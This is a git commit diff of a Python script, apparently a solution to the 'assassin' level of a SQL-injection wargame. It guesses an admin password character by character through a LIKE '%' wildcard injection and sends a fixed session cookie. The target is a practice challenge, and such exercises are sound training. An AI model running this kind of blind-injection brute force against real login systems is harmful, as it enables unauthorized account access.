753019fef7b214a45fed784a8c10ec5e9d72c790
as3617 <46442697+as3617@users.noreply.github.com>
2020-05-10 19:18:20 +0900

    Update rubiya_assassin.py

--- web/rubiya_assassin.py
+++ web/rubiya_assassin.py
@@ -1,17 +1,19 @@
 import requests
 import string
 
-
 a = string.printable
 a=a[:-38]
-password=''
-for admin_len in range(8) :
-    for admin_pass in a:
-        URL='http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php'
-        query={'pw': str(password)+str(admin_pass)+'%'}
-        cookies = {'PHPSESSID': '7v7frt2j61ef77qr21dfku1kqb'}
+pw=''
+pw_=''
+for i in range(8) :
+    for j in a:
+        pw_=pw
+        pw_+=str(j)
+        URL='https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='+str(pw_)+'%'
+        cookies = {'PHPSESSID': 'uo4qgalh2dduriqkrl7kvg5a8g'}
         res=requests.get(URL,cookies=cookies)
+        print(pw_)
         if("Hello admin" in res.text or "Hello guest" in res.text):
-            password=password+chr(admin_pass)
-            print(password)
+            pw=pw+str(j)
+            print('find!')
             break
